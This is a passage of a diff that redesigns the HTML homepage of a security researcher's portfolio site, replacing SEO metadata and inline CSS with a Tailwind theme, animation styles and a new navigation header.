@@ -1,782 +1,2191 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#0a0a0a">
-    <title>Balvant Chavda - Cybersecurity Researcher</title>
-    
-    <!-- Critical CSS: load render-blocking to avoid FOUC -->
-    <link rel="stylesheet" href="css/style.css">
-    
-    <!-- Resource hints for faster loading -->
-    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
-    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
-    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
-    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    
-    <!-- Fonts and icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" media="print" onload="this.media='all'">
-    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"></noscript>
-    <link rel="preload" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap"></noscript>
-    
-    <!-- Non-critical CSS -->
-    <link rel="stylesheet" href="css/shield-animation.css" media="print" onload="this.media='all'">
-    
-    <!-- Preload critical images -->
-    <link rel="preload" href="images/a2.jpeg" as="image">
-    <link rel="preload" href="images/android-auth.jpeg" as="image">
-    <link rel="preload" href="images/1.jpeg" as="image">
-    
-    <!-- SEO and PWA -->
-    <meta name="description" content="Balvant Chavda - Cybersecurity researcher specializing in Android, iOS, Web, and Web3 security. View blog posts, CVE discoveries, and achievements.">
-    <meta name="keywords" content="Balvant Chavda, cybersecurity researcher, ethical hacker, Android security, iOS security, Web3 security, bug bounty, CVE, vulnerability research, penetration testing, security consultant">
-    <meta name="author" content="Balvant Chavda">
-    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
-    <meta name="googlebot" content="index, follow">
-    <meta name="bingbot" content="index, follow">
-    
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://balvant.in/">
-    <meta property="og:title" content="Balvant Chavda - Cybersecurity Researcher & Ethical Hacker">
-    <meta property="og:description" content="Cybersecurity researcher specializing in Android, iOS, Web, and Web3 security. Discover vulnerabilities, write security research, and contribute to the security community.">
-    <meta property="og:image" content="https://balvant.in/images/og-image.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:site_name" content="Balvant Chavda">
-    <meta property="og:locale" content="en_US">
-    
-    <!-- Twitter -->
-    <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://balvant.in/">
-    <meta property="twitter:title" content="Balvant Chavda - Cybersecurity Researcher & Ethical Hacker">
-    <meta property="twitter:description" content="Cybersecurity researcher specializing in Android, iOS, Web, and Web3 security. Discover vulnerabilities, write security research, and contribute to the security community.">
-    <meta property="twitter:image" content="https://balvant.in/images/og-image.jpg">
-    <meta property="twitter:creator" content="@ba1van7">
-    <meta property="twitter:site" content="@ba1van7">
-    
-    <!-- Additional SEO -->
-    <meta name="theme-color" content="#00ffa3">
-    <meta name="msapplication-TileColor" content="#00ffa3">
-    <meta name="msapplication-config" content="/browserconfig.xml">
-    <link rel="canonical" href="https://balvant.in/">
-    <meta http-equiv="Cache-Control" content="max-age=86400">
-    <link rel="manifest" href="manifest.json">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <link rel="apple-touch-icon" href="images/icon-192.png">
-    
-    <!-- Structured Data -->
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Person",
-      "name": "Balvant Chavda",
-      "alternateName": "0xBalvant",
-      "url": "https://balvant.in",
-      "image": "https://balvant.in/images/balvant-profile.jpg",
-      "description": "Cybersecurity researcher specializing in Android, iOS, Web, and Web3 security",
-      "jobTitle": "Cybersecurity Researcher & Ethical Hacker",
-      "worksFor": {
-        "@type": "Organization",
-        "name": "Independent Security Researcher"
-      },
-      "knowsAbout": [
-        "Cybersecurity",
-        "Android Security",
-        "iOS Security", 
-        "Web Security",
-        "Web3 Security",
-        "Blockchain Security",
-        "Penetration Testing",
-        "Vulnerability Research",
-        "Bug Bounty Hunting"
-      ],
-      "sameAs": [
-        "https://twitter.com/ba1van7",
-        "https://linkedin.com/in/balvant-chavda",
-        "https://discord.com/users/ba1van7",
-        "https://app.ens.domains/name/balvant.eth"
-      ],
-      "award": [
-        "Google Security Hall of Fame",
-        "Microsoft Security Hall of Fame", 
-        "Apple Security Hall of Fame",
-        "Meta Security Hall of Fame",
-        "Amazon Security Hall of Fame"
-      ]
-    }
+    <meta name="theme-color" content="#020408">
+    <title>Balvant.IN | Security Researcher</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        display: ["JetBrains Mono", "monospace"],
+                        sans: ["Inter", "sans-serif"],
+                    },
+                    colors: {
+                        primary: "#00FFC2",
+                        accent: "#FF00E5",
+                        emerald: "#059669",
+                        "background-dark": "#020408",
+                    },
+                    animation: {
+                        'float': 'float 6s ease-in-out infinite',
+                        'rotate-3d': 'rotate3d 12s linear infinite',
+                        'pulse-glow': 'pulseGlow 4s ease-in-out infinite',
+                        'scanning-fast': 'scanline 2s linear infinite',
+                        'gradient-x': 'gradientX 3s ease infinite',
+                        'tilt': 'tilt 10s infinite linear',
+                        'marquee': 'marquee 30s linear infinite',
+                    },
+                    keyframes: {
+                        gradientX: {
+                            '0%, 100%': { 'background-size': '200% 200%', 'background-position': 'left center' },
+                            '50%': { 'background-size': '200% 200%', 'background-position': 'right center' },
+                        },
+                        tilt: {
+                            '0%, 50%, 100%': { transform: 'rotate(0deg)' },
+                            '25%': { transform: 'rotate(1deg)' },
+                            '75%': { transform: 'rotate(-1deg)' },
+                        },
+                        marquee: {
+                            '0%': { transform: 'translateX(0)' },
+                            '100%': { transform: 'translateX(-50%)' }
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-30px)' },
+                        },
+                        rotate3d: {
+                            '0%': { transform: 'rotateX(0deg) rotateY(0deg) rotateZ(0deg)' },
+                            '100%': { transform: 'rotateX(360deg) rotateY(360deg) rotateZ(360deg)' },
+                        },
+                        pulseGlow: {
+                            '0%, 100%': { opacity: '0.4', filter: 'blur(40px)' },
+                            '50%': { opacity: '0.8', filter: 'blur(60px)' }
+                        },
+                        scanline: {
+                            '0%': { transform: 'translateY(-100%)' },
+                            '100%': { transform: 'translateY(100%)' }
+                        }
+                    }
+                }
+            }
+        }
     </script>
-    
-    <!-- Blog Posts Structured Data -->
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Blog",
-      "name": "Balvant Chavda Security Blog",
-      "description": "Cybersecurity research blog covering Android, iOS, Web, and Web3 security vulnerabilities and discoveries",
-      "url": "https://balvant.in/#blog",
-      "author": {
-        "@type": "Person",
-        "name": "Balvant Chavda",
-        "url": "https://balvant.in"
-      },
-      "blogPost": [
-        {
-          "@type": "BlogPosting",
-          "headline": "When WebView Bites Back: The Bug That Let JavaScript Run Wild",
-          "description": "Discovering how improper WebView implementations in Android applications can lead to arbitrary JavaScript execution and potential security risks.",
-          "url": "https://balvant.in/blog/android-webview-vulnerability.html",
-          "datePublished": "2024-01-15",
-          "author": {
-            "@type": "Person",
-            "name": "Balvant Chavda"
-          },
-          "image": "https://balvant.in/images/a2.jpeg",
-          "keywords": ["Android Security", "WebView", "JavaScript Injection", "Mobile Security"]
-        },
-        {
-          "@type": "BlogPosting",
-          "headline": "How a News App Leaked OAuth Codes: A Real-World Interception Story",
-          "description": "Discovering a critical vulnerability in an Android news application that allowed malicious apps to intercept OAuth authorization codes.",
-          "url": "https://balvant.in/blog/android-news-app-vulnerability.html",
-          "datePublished": "2024-01-10",
-          "author": {
-            "@type": "Person",
-            "name": "Balvant Chavda"
-          },
-          "image": "https://balvant.in/images/android-auth.jpeg",
-          "keywords": ["Android Security", "OAuth", "Authorization", "Mobile Security"]
-        },
-        {
-          "@type": "BlogPosting",
-          "headline": "SQLi Finding and Exploitation",
-          "description": "A detailed walkthrough of discovering and exploiting a SQL injection vulnerability that led to a significant bug bounty reward.",
-          "url": "https://balvant.in/blog/sql-injection-writeup.html",
-          "datePublished": "2024-01-05",
-          "author": {
-            "@type": "Person",
-            "name": "Balvant Chavda"
-          },
-          "image": "https://balvant.in/images/1.jpeg",
-          "keywords": ["SQL Injection", "Web Security", "Bug Bounty", "Penetration Testing"]
+    <style type="text/css">
+        @theme {
+            --font-display: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            --font-sans: "Inter", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
         }
-      ]
-    }
-    </script>
-    
-    <!-- Performance optimization -->
-    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
-    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    
-    <!-- Preload critical JS -->
-    <link rel="preload" href="js/main.js" as="script" onload="this.onload=null;this.rel='preload'">
-    
-    <!-- Inline critical CSS for above-the-fold content -->
-    <style>
-        /* Critical CSS */
-        :root {
-            --primary-color: #00ffa3;
-            --bg-color: #0a0a0a;
-            --text-color: #ffffff;
+
+        @layer base {
+            html {
+                scroll-behavior: smooth;
+                scroll-padding-top: 100px;
+                overflow-x: hidden;
+                -webkit-tap-highlight-color: transparent;
+            }
+            body {
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+            @media (max-width: 640px) {
+                html { scroll-padding-top: 80px; }
+            }
         }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
         }
-        
-        body {
-            font-family: 'JetBrains Mono', monospace;
-            line-height: 1.6;
-            color: var(--text-color);
-            background-color: var(--bg-color);
-            overflow-x: hidden;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
+
+        .header-scrolled {
+            background: rgba(2, 4, 8, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(0, 255, 194, 0.1);
+            padding-top: 0.5rem !important;
+            padding-bottom: 0.5rem !important;
         }
-        
-        /* Header styles - ULTRA VISIBLE */
-        header {
-            position: fixed !important;
-            top: 0 !important;
-            left: 0 !important;
-            width: 100% !important;
-            z-index: 99999 !important;
-            background: #0a0a0f !important;
-            background-image: linear-gradient(135deg, rgba(10, 10, 15, 1) 0%, rgba(5, 5, 15, 1) 100%) !important;
-            backdrop-filter: blur(20px) !important;
-            -webkit-backdrop-filter: blur(20px) !important;
-            padding: 0.8rem 0 !important;
-            display: block !important;
-            visibility: visible !important;
-            opacity: 1 !important;
-            border-bottom: none !important;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.8) !important;
+        .text-glow-cyan {
+            text-shadow: 0 0 15px rgba(0, 255, 194, 0.8);
         }
-        
-        header .container {
-            display: flex !important;
-            visibility: visible !important;
-            opacity: 1 !important;
+        .text-glow-magenta {
+            text-shadow: 0 0 15px rgba(255, 0, 229, 0.8);
         }
-        
-        .logo,
-        .menu-toggle {
-            display: flex !important;
-            visibility: visible !important;
-            opacity: 1 !important;
-            color: #fff !important;
+        .digital-glow-logo {
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5), 0 0 20px rgba(0, 255, 194, 0.3);
         }
-        
+        .glass-panel {
+            background: rgba(5, 7, 10, 0.8);
+            backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .grid-pattern {
+            background-image: radial-gradient(circle, rgba(0, 255, 194, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+        .typewriter-cursor::after {
+            content: '_';
+            animation: blink 0.8s step-end infinite;
+            color: #00FFC2;
+        }
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .core-container {
+            perspective: 1200px;
+            width: min(300px, 85vw);
+            height: min(300px, 85vw);
+        }
         @media (max-width: 768px) {
-            header {
-                padding: 0.6rem 0 !important;
-                background: #0a0a0f !important;
-                background-image: linear-gradient(135deg, rgba(10, 10, 15, 1) 0%, rgba(5, 5, 15, 1) 100%) !important;
-                z-index: 99999 !important;
-                min-height: 60px !important;
-            }
-            
-            header .container {
-                display: flex !important;
-                padding: 0 1rem !important;
-            }
-            
-            .logo,
-            .menu-toggle {
-                display: flex !important;
-                color: #fff !important;
-            }
+            .core-container { width: min(220px, 70vw); height: min(220px, 70vw); }
         }
-        
-        .container {
+        .octahedron {
+            position: relative;
             width: 100%;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 1.5rem;
+            height: 100%;
+            transform-style: preserve-3d;
+        }
+        .face {
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-left: 75px solid transparent;
+            border-right: 75px solid transparent;
+            left: 75px;
+            opacity: 0.8;
+            backdrop-filter: blur(4px);
+        }
+        .face-top {
+            border-bottom: 130px solid rgba(255, 255, 255, 0.08);
+            transform-origin: 50% 100%;
+            top: 20px;
+        }
+        .face-bottom {
+            border-top: 130px solid rgba(255, 255, 255, 0.08);
+            transform-origin: 50% 0%;
+            top: 150px;
+        }
+        .face::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -75px;
+            width: 150px; height: 130px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+        }
+        .face-bottom::after {
+            clip-path: polygon(0% 0%, 100% 0%, 50% 100%);
+        }
+        .f1 { transform: rotateY(0deg) rotateX(35deg); }
+        .f2 { transform: rotateY(90deg) rotateX(35deg); }
+        .f3 { transform: rotateY(180deg) rotateX(35deg); }
+        .f4 { transform: rotateY(270deg) rotateX(35deg); }
+        .f5 { transform: rotateY(0deg) rotateX(-35deg); }
+        .f6 { transform: rotateY(90deg) rotateX(-35deg); }
+        .f7 { transform: rotateY(180deg) rotateX(-35deg); }
+        .f8 { transform: rotateY(270deg) rotateX(-35deg); }
+        .core-light {
+            background: radial-gradient(circle, rgba(0, 255, 194, 0.8) 0%, rgba(255, 0, 229, 0.6) 100%);
+            box-shadow: 0 0 60px rgba(0, 255, 194, 0.4), 0 0 100px rgba(255, 0, 229, 0.2);
+        }
+        .constellation-link {
+            position: absolute;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 194, 0.2), transparent);
+            height: 1px;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .nav-button {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .nav-button:hover {
+            transform: scale(1.05);
+        }
+        .nav-button:active {
+            transform: scale(0.95);
+        }
+        .fade-in {
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        .intel-card {
+            background: rgba(10, 12, 16, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(12px);
+        }
+        .intel-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: var(--card-accent, #00FFC2);
+            opacity: 0.3;
+            transition: opacity 0.3s ease;
+        }
+        .intel-card:hover {
+            background: rgba(15, 18, 25, 0.8);
+            border-color: var(--card-accent, rgba(0, 255, 194, 0.4));
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.5), 0 0 20px -5px var(--card-accent, rgba(0, 255, 194, 0.2));
+        }
+        .intel-card:hover::before {
+            opacity: 1;
+        }
+        .intel-card .card-glow {
+            position: absolute;
+            top: 0; right: 0;
+            width: 150px; height: 150px;
+            background: radial-gradient(circle at top right, var(--card-accent, rgba(0, 255, 194, 0.1)), transparent 70%);
+            pointer-events: none;
+        }
+        .category-tag {
+            font-family: var(--f-mono);
+            font-size: 9px;
+            font-weight: 800;
+            letter-spacing: 0.2em;
+            padding: 4px 10px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+        .intel-card:hover .category-tag {
+            border-color: var(--card-accent, #00FFC2);
+            color: var(--card-accent, #00FFC2);
+            background: var(--card-accent-alpha, rgba(0, 255, 194, 0.05));
+        }
+        .blog-title {
+            background: linear-gradient(to bottom right, #fff 50%, rgba(255,255,255,0.5));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            transition: all 0.3s ease;
+        }
+        .intel-card:hover .blog-title {
+            background: linear-gradient(to bottom right, #fff, var(--card-accent, #00FFC2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .code-block-container {
+            margin: 1.5rem 0;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: #161b22;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .code-block-header {
+            background: rgba(255, 255, 255, 0.05);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .code-block-header span {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .terminal-dots {
+            display: flex;
+            gap: 6px;
+        }
+        .terminal-dot {
+            width: 8px; height: 8px; border-radius: 50%;
         }
         
-        /* Logo styles */
-        .logo {
-            font-size: 1.8rem;
+        /* Blog Content Styles */
+        .blog-image-container {
+            margin: 3rem 0;
+            text-align: center;
+        }
+        .blog-image {
+            width: 100%;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+        }
+        .image-caption {
+            margin-top: 1rem;
+            font-size: 11px;
+            font-family: 'JetBrains Mono', monospace;
+            color: rgba(255, 255, 255, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+        .steps-list {
+            list-style: none;
+            padding: 0;
+            margin: 3rem 0;
+            counter-reset: step-counter;
+        }
+        .steps-list li {
+            position: relative;
+            padding-left: 4rem;
+            margin-bottom: 3rem;
+            counter-increment: step-counter;
+        }
+        .steps-list li::before {
+            content: counter(step-counter, decimal-leading-zero);
+            position: absolute;
+            left: 0;
+            top: 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--card-accent, #00FFC2);
+            opacity: 0.3;
+        }
+        .steps-list h3 {
+            font-size: 1.25rem;
             font-weight: 700;
-            color: var(--text-color);
-            text-decoration: none;
-            transition: transform 0.3s ease;
-            display: inline-block;
+            color: white;
+            margin-bottom: 0.75rem;
         }
-        
-        .logo .domain {
-            color: var(--primary-color);
+        .steps-list p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.95rem;
+            line-height: 1.7;
         }
     </style>
 </head>
-<body>
-    <!-- Liquid background -->
-    <div class="liquid-bg" aria-hidden="true">
-        <div class="orb orb1"></div>
-        <div class="orb orb2"></div>
-        <div class="orb orb3"></div>
+<body class="bg-background-dark font-sans text-slate-200 min-h-screen overflow-x-hidden selection:bg-primary selection:text-black pb-[env(safe-area-inset-bottom)]">
+    <!-- Background Effects -->
+    <div class="fixed inset-0 grid-pattern pointer-events-none opacity-40"></div>
+    <div class="fixed inset-0 pointer-events-none overflow-hidden">
+        <div class="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-transparent via-primary/5 to-transparent animate-scanning-fast opacity-20"></div>
     </div>
-    <div class="noise-overlay" aria-hidden="true"></div>
-    <div class="glow-overlay" aria-hidden="true"></div>
-    <!-- Header with Avatar - MOVED BEFORE BACKGROUND OVERLAYS -->
-    <header style="position: fixed !important; top: 0 !important; left: 0 !important; width: 100% !important; z-index: 999999 !important; background: #0a0a0f !important; display: block !important; visibility: visible !important; opacity: 1 !important;">
-        <div class="container">
-            <a href="index.html" class="logo">
-                <span class="logo-bracket logo-bracket-left" aria-hidden="true">[</span>
-                <span class="logo-text">Balvant<span class="domain">.IN</span></span>
-                <span class="logo-bracket logo-bracket-right" aria-hidden="true">]</span>
+
+    <!-- Header -->
+    <header class="fixed top-0 left-0 w-full z-[100] transition-all duration-500 pt-[env(safe-area-inset-top)]" id="main-header">
+        <div class="max-w-7xl mx-auto w-full flex items-center justify-between px-4 sm:px-6 py-3 sm:py-4 md:py-6 transition-all duration-500" id="header-container">
+            <a href="index.html" class="flex items-center gap-1.5 cursor-pointer group" onclick="if(!window.location.pathname.includes('books')&&!window.location.pathname.includes('contact')){var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}window.scrollTo({top:0,behavior:'smooth'});return false;}">
+                <div class="font-display text-2xl font-black tracking-tighter relative group flex items-center">
+                    <div class="relative flex items-center gap-3 group-hover:scale-105 transition-transform duration-500">
+                        <div class="w-11 h-11 rounded-full bg-primary/10 border border-primary/30 flex items-center justify-center relative overflow-hidden group-hover:border-primary/60 transition-colors">
+                            <div class="absolute inset-0 bg-gradient-to-br from-primary/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                            <img src="https://api.dicebear.com/7.x/bottts-neutral/svg?seed=Balvant&backgroundColor=00ffba" alt="Avatar" class="w-full h-full object-cover transition-all duration-500 group-hover:scale-0 group-hover:opacity-0">
+                            <div class="absolute inset-0 flex items-center justify-center scale-0 opacity-0 group-hover:scale-100 group-hover:opacity-100 transition-all duration-500">
+                                <i data-lucide="shield-check" class="w-6 h-6 text-primary"></i>
+                            </div>
+                        </div>
+                        <div class="flex flex-col -space-y-1">
+                            <span class="text-white text-xl tracking-tight group-hover:text-primary transition-colors">BALVANT</span>
+                            <span class="text-primary/60 text-[10px] font-bold tracking-[0.3em]">BALVANT.IN</span>
+                        </div>
+                    </div>
+                </div>
             </a>
-            <button class="menu-toggle" aria-label="Toggle menu" aria-expanded="false">
-                <i class="fas fa-bars" aria-hidden="true"></i>
-            </button>
-            <nav aria-label="Main navigation">
-                <ul>
-                    <li><a href="#blog"><span><i class="fas fa-blog" aria-hidden="true"></i> Blog</span></a></li>
-                    <li><a href="#cves"><span><i class="fas fa-bug" aria-hidden="true"></i> CVEs</span></a></li>
-                    <li><a href="books.html"><span><i class="fas fa-book" aria-hidden="true"></i> Books</span></a></li>
-                    <li><a href="#hall-of-fame"><span><i class="fas fa-trophy" aria-hidden="true"></i> Hall of Fame</span></a></li>
-                    <!-- <li><a href="projects.html"><span><i class="fas fa-code-branch" aria-hidden="true"></i> Projects</span></a></li> -->
-                    <li><a href="contact.html" class="contact-btn"><span><i class="fas fa-paper-plane" aria-hidden="true"></i> Contact Me</span></a></li>
-                </ul>
+
+            <!-- Desktop Nav -->
+            <nav class="hidden lg:flex items-center gap-2">
+                <a href="index.html#blog" class="nav-btn group relative px-5 py-2.5 flex items-center gap-3 overflow-hidden transition-all duration-300 rounded-lg" onclick="var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}">
+                    <div class="absolute inset-0 border border-white/10 bg-white/5 group-hover:border-primary/40 group-hover:bg-primary/10 group-hover:shadow-[0_0_20px_-5px_rgba(0,255,194,0.3)] transition-all rounded-lg"></div>
+                    <div class="absolute top-0 left-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-top-left rounded-full"></div>
+                    <div class="absolute bottom-0 right-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-bottom-right rounded-full"></div>
+                    <i data-lucide="rss" class="w-4 h-4 text-primary opacity-80 group-hover:opacity-100 group-hover:scale-110 transition-all relative z-10"></i>
+                    <span class="text-[10px] font-mono font-bold tracking-[0.15em] text-white/90 group-hover:text-primary transition-colors uppercase relative z-10">BLOG</span>
+                </a>
+                <a href="index.html#blog" class="nav-btn group relative px-5 py-2.5 flex items-center gap-3 overflow-hidden transition-all duration-300 rounded-lg" onclick="var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}">
+                    <div class="absolute inset-0 border border-white/10 bg-white/5 group-hover:border-primary/40 group-hover:bg-primary/10 group-hover:shadow-[0_0_20px_-5px_rgba(0,255,194,0.3)] transition-all rounded-lg"></div>
+                    <div class="absolute top-0 left-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-top-left rounded-full"></div>
+                    <div class="absolute bottom-0 right-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-bottom-right rounded-full"></div>
+                    <i data-lucide="bug" class="w-4 h-4 text-primary opacity-80 group-hover:opacity-100 group-hover:scale-110 transition-all relative z-10"></i>
+                    <span class="text-[10px] font-mono font-bold tracking-[0.15em] text-white/90 group-hover:text-primary transition-colors uppercase relative z-10">CVES</span>
+                </a>
+                <a href="books.html" class="nav-btn group relative px-5 py-2.5 flex items-center gap-3 overflow-hidden transition-all duration-300 rounded-lg">
+                    <div class="absolute inset-0 border border-white/10 bg-white/5 group-hover:border-primary/40 group-hover:bg-primary/10 group-hover:shadow-[0_0_20px_-5px_rgba(0,255,194,0.3)] transition-all rounded-lg"></div>
+                    <div class="absolute top-0 left-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-top-left rounded-full"></div>
+                    <div class="absolute bottom-0 right-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-bottom-right rounded-full"></div>
+                    <i data-lucide="book-open" class="w-4 h-4 text-primary opacity-80 group-hover:opacity-100 group-hover:scale-110 transition-all relative z-10"></i>
+                    <span class="text-[10px] font-mono font-bold tracking-[0.15em] text-white/90 group-hover:text-primary transition-colors uppercase relative z-10">BOOKS</span>
+                </a>
+                <a href="index.html#hall-of-fame" class="nav-btn group relative px-5 py-2.5 flex items-center gap-3 overflow-hidden transition-all duration-300 rounded-lg" onclick="var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}">
+                    <div class="absolute inset-0 border border-white/10 bg-white/5 group-hover:border-primary/40 group-hover:bg-primary/10 group-hover:shadow-[0_0_20px_-5px_rgba(0,255,194,0.3)] transition-all rounded-lg"></div>
+                    <div class="absolute top-0 left-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-top-left rounded-full"></div>
+                    <div class="absolute bottom-0 right-0 w-1 h-1 bg-primary scale-0 group-hover:scale-100 transition-transform origin-bottom-right rounded-full"></div>
+                    <i data-lucide="trophy" class="w-4 h-4 text-primary opacity-80 group-hover:opacity-100 group-hover:scale-110 transition-all relative z-10"></i>
+                    <span class="text-[10px] font-mono font-bold tracking-[0.15em] text-white/90 group-hover:text-primary transition-colors uppercase relative z-10">HALL_OF_FAME</span>
+                </a>
             </nav>
+
+            <div class="flex items-center gap-4">
+                <a href="contact.html" class="group relative px-6 py-2.5 flex items-center gap-3 overflow-hidden transition-all duration-500">
+                    <div class="absolute inset-0 bg-primary/5 border border-primary/20 group-hover:bg-primary/10 group-hover:border-primary/50 transition-all"></div>
+                    <div class="absolute inset-0 bg-gradient-to-r from-primary/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000 ease-in-out"></div>
+                    <i data-lucide="send" class="w-4 h-4 text-primary relative z-10"></i>
+                    <span class="text-[10px] font-mono font-bold tracking-[0.2em] text-primary relative z-10 uppercase">CONTACT_ME</span>
+                    <div class="absolute top-0 left-0 w-2 h-[1px] bg-primary"></div>
+                    <div class="absolute bottom-0 right-0 w-2 h-[1px] bg-primary"></div>
+                    <div class="absolute top-0 left-0 w-[1px] h-2 bg-primary"></div>
+                    <div class="absolute bottom-0 right-0 w-[1px] h-2 bg-primary"></div>
+                </a>
+
+                <!-- Mobile Menu Toggle -->
